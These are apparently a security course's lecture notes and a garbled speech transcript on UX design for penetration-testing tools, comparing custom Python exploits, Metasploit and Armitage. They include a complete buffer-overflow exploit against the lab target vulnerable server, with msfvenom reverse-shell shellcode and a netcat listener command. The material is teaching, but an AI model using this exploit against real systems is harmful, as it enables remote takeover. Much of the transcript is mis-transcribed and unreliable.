# Keep it Simple

TO BE EDITTED

We are going to first talk about what is UX design.
UX means user experience. 
Then we will talk about how we design our penetration testing tools and.

## UX Design Overview

### UX Design
UX design, the user experience desig, is very important.
Think about this.
Before iPhone, there were so many other phones.
However, when iPhone came out, it dominated the market
Why?
It is because iPhone put mp3 player, video streaming, email, and
Internet all together nicely.
Before iPhone there were a few other products like personal digital assistant (PDA).
However, their interface was not so nice and hard to use all the funtionalities.
The user experience on those products was not such good.
It was often hard to find some functionalities.
You have to go through a lenthy procedure to do something.
iPhone was a game chager.
When you use iPhone, you find a functionality easily.
That's called the user experience design.

So user interface and experience design is critical.
The user shall have a meaningful and relevant experience.
You can do your work with the product easily.
That's very important.

### Simplicity

One design philosophy in user experience design is called simplicity.
Some software programs are very complicated and hard to use.
Are you going to use it if nobody actually pushes you to use it?
That's why simplicity is one critical design philosophy.

When you design your product or your app,
if you want people to use it, people shouldn't go through
a very complicated procedure to use it.
They shall be able to use your product and achieve their goals easily and quickly.
They shall enjoy the experience.

People now use smartphones for everything, e.g., video streaming and browsing.
Although the screen is small, it is convenient in many cases.
The design of smartphones makes these things much easier than before.
That is why people now are watching movies even on smartphones.

### UXD in CyberSecurity
Let's look at one example, penetration testing.
Assume you are a vendor and wants to sell a penetration testing tool.
How do you design your tool?
If you make your penetration testing tool very complicated, what will happen?
Of course you will lose the market because nobody wants to use the tool.

Here are the requirements for UXD in cyber security.
Many cyber security hardware and software programs are very hard to use.
I think we still need to do a lot of things to improve the design of the equipment and tools.
One critical advance in cyber security of recent years is user authentication.
When you use iPhone amd Android phones, 
what is the authentication method for unlocking the smartphone screen?
Passcode, face ID or touch ID?
Face ID and touch ID are getting popular since they are pretty secure to some context, very convinient, and easy to use, compared with passcode.

## Penetration Testing Tool UX Design
### Goal of Penetration Testing Tools
Why do we need a penetration testing tool?
What is the goal of using a penetration testing tool?
Such a tool will be used by penetration testers, who may scan the web,
network and computers to test if anything is not secure.

Here are a few concepts, confidentiality, integrity and availability (CIA).
What is confidentiality? It means you don't want your secret
messages to be known to other people.
For example, encryption encrypts ypur messages and provides confidentiality.
What is integrity? 
integrity means if somebody changes your files you should
be able to find they are changed.
Availability means when you
actually want to use a service, it should be up, running and providing the service.

Penetration testing help achieve CIA.
It will identify vulnerabilities, which may impact the CIA.
That's why we need such tool.

### Design Choices
The problem is how you can implement the tool?
Here are three options:
- Programing a tool
- Using Metasploit
- Using Armitage

### Method 1. Programing a Tool
You are a programming guru. You tell your customer: It's easy; just
use python to program a tool? Here are the programming documents. 
So you sell you this brochure on how to program a penetration testing tool.

```
# To receive the reverse shell, run the following command at another terminal
#   nc -l -v -p 4444
# This module "socket" provides access to the BSD socket interface
import socket
# This module "struct" performs conversions between Python values
# and C structs represented as Python bytes objects.
import struct

HOST = '10.0.2.7'   # vitcim IP
PORT = 9999         # victim port

# Shellcode created by msfvenom
# msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.8 LPORT=4444 EXITFUNC=thread -f python -v SHELL -b '\x00\x0a\x0a' 
SHELL =  b""
SHELL += b"\xba\xb7\x9a\xd6\x72\xd9\xea\xd9\x74\x24\xf4\x5e"
SHELL += b"\x29\xc9\xb1\x52\x83\xc6\x04\x31\x56\x0e\x03\xe1"
SHELL += b"\x94\x34\x87\xf1\x41\x3a\x68\x09\x92\x5b\xe0\xec"
SHELL += b"\xa3\x5b\x96\x65\x93\x6b\xdc\x2b\x18\x07\xb0\xdf"
SHELL += b"\xab\x65\x1d\xd0\x1c\xc3\x7b\xdf\x9d\x78\xbf\x7e"
SHELL += b"\x1e\x83\xec\xa0\x1f\x4c\xe1\xa1\x58\xb1\x08\xf3"
SHELL += b"\x31\xbd\xbf\xe3\x36\x8b\x03\x88\x05\x1d\x04\x6d"
SHELL += b"\xdd\x1c\x25\x20\x55\x47\xe5\xc3\xba\xf3\xac\xdb"
SHELL += b"\xdf\x3e\x66\x50\x2b\xb4\x79\xb0\x65\x35\xd5\xfd"
SHELL += b"\x49\xc4\x27\x3a\x6d\x37\x52\x32\x8d\xca\x65\x81"
SHELL += b"\xef\x10\xe3\x11\x57\xd2\x53\xfd\x69\x37\x05\x76"
SHELL += b"\x65\xfc\x41\xd0\x6a\x03\x85\x6b\x96\x88\x28\xbb"
SHELL += b"\x1e\xca\x0e\x1f\x7a\x88\x2f\x06\x26\x7f\x4f\x58"
SHELL += b"\x89\x20\xf5\x13\x24\x34\x84\x7e\x21\xf9\xa5\x80"
SHELL += b"\xb1\x95\xbe\xf3\x83\x3a\x15\x9b\xaf\xb3\xb3\x5c"
SHELL += b"\xcf\xe9\x04\xf2\x2e\x12\x75\xdb\xf4\x46\x25\x73"
SHELL += b"\xdc\xe6\xae\x83\xe1\x32\x60\xd3\x4d\xed\xc1\x83"
SHELL += b"\x2d\x5d\xaa\xc9\xa1\x82\xca\xf2\x6b\xab\x61\x09"
SHELL += b"\xfc\xde\x75\x13\xf4\xb6\x77\x13\x15\x1b\xf1\xf5"
SHELL += b"\x7f\xb3\x57\xae\x17\x2a\xf2\x24\x89\xb3\x28\x41"
SHELL += b"\x89\x38\xdf\xb6\x44\xc9\xaa\xa4\x31\x39\xe1\x96"
SHELL += b"\x94\x46\xdf\xbe\x7b\xd4\x84\x3e\xf5\xc5\x12\x69"
SHELL += b"\x52\x3b\x6b\xff\x4e\x62\xc5\x1d\x93\xf2\x2e\xa5"
SHELL += b"\x48\xc7\xb1\x24\x1c\x73\x96\x36\xd8\x7c\x92\x62"
SHELL += b"\xb4\x2a\x4c\xdc\x72\x85\x3e\xb6\x2c\x7a\xe9\x5e"
SHELL += b"\xa8\xb0\x2a\x18\xb5\x9c\xdc\xc4\x04\x49\x99\xfb"
SHELL += b"\xa9\x1d\x2d\x84\xd7\xbd\xd2\x5f\x5c\xdd\x30\x75"
SHELL += b"\xa9\x76\xed\x1c\x10\x1b\x0e\xcb\x57\x22\x8d\xf9"
SHELL += b"\x27\xd1\x8d\x88\x22\x9d\x09\x61\x5f\x8e\xff\x85"
SHELL += b"\xcc\xaf\xd5"

# Payload to inject into vulnserver
PAYLOAD = (
    b'KNOCK /.:/' +  # TRUN command of the server
    b'A' * 2002 +   # padding 
    # 62501205   FFE4             JMP ESP
    # Return a bytes object.
    # Format string '<L': < means little-endian;
    # L means unsigned long
    struct.pack('<L', 0x6250151C) + 
    b'C' * 32 +
    SHELL
    # b'C' * (5000 - 2003 - 4 - 32 - len(SHELL)) # no need really
)

with socket.create_connection((HOST, PORT)) as fd:
    fd.sendall(PAYLOAD)

```


is using metasploit so minus plus you
have to run a few commands a lot of
commands okay i'll show you
so the third approach is using montage
that's what you are using today
but let's look at each option you see
which one
actually you want to sell to your
customers right so basically you are
selling your products to
the print testers okay
so the first option is a programming or
two
and uh
so anybody here can program a
penetration testing tool
do you know how to start
you need a lot of knowledge actually to
start it
and you have to learn network
programming it's called a software
programming
you have to learn gui programming is a
graphical user interface programming
right
because you want to give user interface
you have to learn many other things to
actually design the tool and the program
materials so you can see here you know
many people cannot do it
and uh so here this is the first step
let me show you here
so this is a one example of the two here
so basically here i show you
how you can actually program
to
hack
the valuable server our volleyball chat
server here
and this is the python prover so i'll go
through this quickly
and you can see at the line one
uh the
lines one two seven
uh the lines one
two three are comments
then line four
reach
import stoppage so that's python socket
programming library so you need that to
actually send a package to the target
computer okay
so under line five and the line six we
have comments
so analyze
seven here is import struct so this is a
importing a module called start it has
many other kind of uh
things you can use many other apis you
can use so that's a
another
library of another class
and the line eight so you specify
the mixing id so you specify which ip
you want to actually
try and see if it has the variable
server see if it's vulnerable right
so at nine nine it's port number 9999 so
that's uh
where our volleyball track server
running right
okay
and then here on the right here
is actually payload so you have to
generate
possible
payloads possible mirror so that when
you export
the vulnerable child server portability
this kid will run and we discuss about
corroboree you know so we are going to
send the mirror code and the mirror code
will run when the function returns right
so that's the payload you have to use a
two over there the two is called the rms
value and then so you use that tool to
generate the payload okay
so so you have to know the other two
first okay
and then
finally i'm going to construct the
pillow you remember we mentioned the
message we are constructing another one
meaning by the message right but it's
not a violent battle in this case
you can see here we are doing the 946
that's a possible command of
the valuable test server so because that
command has a problem so i'm targeting
that
chat
not command
then you can see i'm putting
uh some padding over there then payload
and other things the shell is our pillow
and so basically that's the basic i'm a
construction
now at the line 57 and 9 feet of h we
actually stand out of the pair
anybody here can actually program this
uh
i mean two
nobody here
so it takes time to learn right so do
you want this option when you want to
sell to your customer go ahead and
program
the tool and then you can scan anything
right of course they can scan anything
if they know how to program but again it
takes a lot of time
and uh
so
so here
this actual slides i convert my new size
here
so this is the second approach
so when you use an armor task actually
you are using all the commands here i'm
amateur
hash is using not just portable i'm
sorry meta armor charge is using
metasploit the tool to perform the
attack but it provides you the gui
interface
we means graphical user interface they
provide you with a gui so that you don't
see
all the commands
so you just click it will automatically
enter the commands and perform the
attack
right so
see
that's brilliant all right and you can
see a lot here
right so
as you can maybe let me do this
let me actually do this
so it's easy to read
so at the last one here i have some
comments that's my comment so let's
assume somebody creates the attack
module
for many flaws so first you know
somebody has to create the knock module
and actually i created that module
myself and uh our tas
created two other modules for you to use
tomorrow and uh so i couldn't knock
about you so you had to understand how
to create it right and but
that's not program it's very similar to
this one okay so it's very similar to
this one this is in python
but uh metaspot using a lot of
language called ruby so i use the ruby
to program
the nok module which is very similar to
the python ruby and python are very
similar
okay but anyway so that's the first
thing you tell
when it's called i'm going to use that
module
for attack so then you can see here that
at line three basically the manuscript
will tell you okay good and you have to
maybe do some configuration but i don't
care i'm going to just you give you the
default pillow
okay so that means that it's going to
actually
use that payload that's the attack
network
so then at the line 4 here i set remote
host that's my target
okay
then
level 5 that's basically the response
from when it's fraud when i enter status
host
another 192.168.19
methods plot actually will tell me yeah
okay everything's set
down here then at the line six set of
targets the one
module one the text module we're gonna
knock can attack a few targets of course
you have to program
that in your mod
but in this case i'm using proxy zero
that's the one you are using today okay
and uh so that we put the calculator as
zero and then this involves a few
options and uh
for the program okay
so underline eight you set the localhost
and the 910 you set a low uh local port
so basically we are going to collect
into the remote
but you need actually another something
called a network socket
as a local
so that the two computers can work
together your local computer and the
cartridge so now at the line
two io
so now i'm setting payload right i'm i'm
not i don't want to use that to reverse
t maybe i'm using the binary this is a
lot of canopa attacker payload
okay
and line 14 i said i'm going to attack
the port
[Music]
number at
uh remote post right
remote host is a
192.168.1.19 headline
so right and so that's the target port
number finally at the 9 16
okay i'm going to do explosive which i'm
going to attack in the background so we
can do other things
so this second approach
so think about this if today
i teach this do you think you can finish
your tasks today
i think here everybody will be confused
right because my goal here
actually is not
uh to really teach you
how to use method cloud
my goal here is to like to understand
the concepts in qualification testing
and a secure i want you to understand
the vulnerability
is the bubble overflow
right and the payload basically you can
send any mirror so that the mirror will
run on the target so that's my goal here
so but if i teach you this
i have to explain everything in detail
right i don't think anybody here i mean
i i know many people here can finish
this but
you know it's very confusing he done it
actually
but you might go wherever okay so that's
the second approach
so the third approach basically is this
so it's an armitage so you can see here
although armor touch is not very well
programmed because you know sometimes
you have to try like 10 times so that it
works but at least now you understand
by when you do attack
you know
first the target must have a
vulnerability
second and you can stand up a pillow you
can choose a payload right so that the
pendulum can work for example you tried
an interpreter right and in the
interpreter you can actually run a lot
of other commands and you can see it
right so because of the vulnerability
now you can actually run many commands
within the
compromised computer right
and uh so basically i think i achieved
this goal today and also
you can think about
that so when you do confusion testing
your goal is to find out
what vulnerabilities exist as a targeted
computer
you are not trying to teach your
customer how to improve them right so
why should they learn programs
programming their goal is to find out
what advantage so why why they don't
need to actually understand the program
so basically you can see here this
interface is much simpler
much easier to actually to learn i don't
see any trouble today even i started
actually you guys will have trouble to
understand that
you know this panel here but apparently
you know most of people
think this is very intuitive you just
actually expanded the tree you find the
model you want and then you just deploy
it
i don't see actually any trouble here
right so that's about this
three approaches
you know
uh for planetarium testing now you can
see
the user experience design
for these three approaches
is very different and approaching what
which one do you prefer
so tell me of course i know you wanted
the third one right and uh so if you
want to learn the second one and the
first one you have to go to college okay
so that's a lot of storage i think even
in vocational school you may another
teacher actually knows soccer
programming right
but if you want to learn actually how to
program a tool then you have to go to
college and even in college we don't
teach social programming you know we
just tell you go ahead and read it
that's uh the tutorial you're ready to
program it we don't teach software
programming we just tell you the
principle of networking we even don't
teach it
okay
and uh so in college it's very different
you know and but you know when you
design a product your target customers
are not
you know
people who want to learn programming
they just want to finish their goal and
achieve their tasks right so you have to
think about how to make everything
simpler for them so that they can just
achieve their goal quickly efficiently
and effectively okay
and so here is some references about uh
the interaction design foundation here
and so you can you can read the
references and look at
many things about the user design
experience
you know user design
user experience design is a very
hard topic
so
think about that
iphone achieved every dominating the
market because of their design right so
why not other people say the same thing
because you know
understanding people is hard
sometimes you know you have to interview
people
so that you can understand how people
think but even when you try to
interview people
do you think people always tell you the
truth
no right you have to consider what if
you i mean what people actually
like right
so because some people they don't want
to tell you their feeling they just give
you some answer so you know user
experience design is very hard dealing
with people it has a lot of serious
itself and also it's a we have an expert
i think next year we are going to
call
data expert in and so i think that she
can actually know about the user
external design but myself actually
designed a keyboard
so i designed a randomized keyboard for
security so every time
when you actually
try to enter your password
the keyboard
layout all the letters or the symbols
are running placed
so
my running keyboard never succeeded
know the reason because
people have to spend a lot of time so i
mean where is my where's my password on
the keyboard
go ahead
okay
and we actually
uh
[Music]
okay
so when you actually of course when you
go to college
and most of us are like engineers right
if you go to like a computer science
engineering school
and um you know
15 years engineers they really don't
understand
what is called beautiful what is called
not
so you have a car you actually have to
collaborate with the
uh people who do the user experience
design for that but uh computer science
has a research
field called a user historic design and
i know there are many people working in
another field okay so that's another
story here so
many people
doing that they know philosophy we know
actually with psychology
they have a lot of psychology background
because you had to study people okay
so i guess that's actually
all for today and uh
i think we are just unscheduled that's
amazing
and uh so tomorrow uh
this is our schedule here right let me
have a look
let me first
you

